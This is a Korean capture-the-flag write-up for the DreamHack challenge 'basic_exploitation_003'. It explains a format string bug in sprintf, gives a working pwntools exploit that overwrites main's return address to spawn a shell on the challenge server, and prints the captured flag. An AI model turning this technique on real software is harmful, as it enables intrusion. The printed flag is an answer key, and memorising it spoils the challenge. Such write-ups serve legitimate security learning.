# [DreamHack] basic_exploitation_003

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(basic_exploitation_003)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [basic_exploitation_003.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8548725/basic_exploitation_003.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160267191-f843e10c-2acb-44b1-b66c-66bf5e81df07.png)

## Analysis

```c
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```

`sprintf(stack_buf, heap_buf)`에서 `heap_buf`가 format string의 역할을 해서 FSB가 발생한다. 서식 지정자를 이용해서 `stack_buf`에 들어가는 문자열의 길이를 늘릴 수 있고, `main()`의 return address를 `get_shell()`의 주소로 덮으면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_exploitation_003')
else:
    r = remote('host1.dreamhack.games', 22665)

get_shell = 0x8048669  # get_shell()

r.send(b'%156c' + p32(get_shell))

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 22665: Done
[*] Switching to interactive mode
ECHO :
        i\x86\x04
$ cat flag
DH{4e6e355c62249b2da3b566f0d575007e}
```